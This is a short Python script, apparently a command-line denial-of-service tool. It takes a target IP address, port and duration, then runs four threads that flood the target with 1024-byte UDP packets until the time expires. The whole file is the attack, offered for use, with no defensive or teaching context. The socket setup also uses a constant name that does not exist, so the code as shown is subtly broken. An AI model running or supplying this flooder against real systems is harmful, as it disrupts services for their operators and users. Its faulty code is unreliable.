import sys
import socket
import threading
import time

def flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCKET_DGRAM)
    data = b"X" * 1024
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(data, (target_ip, target_port))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 main.py <ip> <port> <time>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    threads = []
    for _ in range(4):
        t = threading.Thread(target=flood, args=(ip, port, duration))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
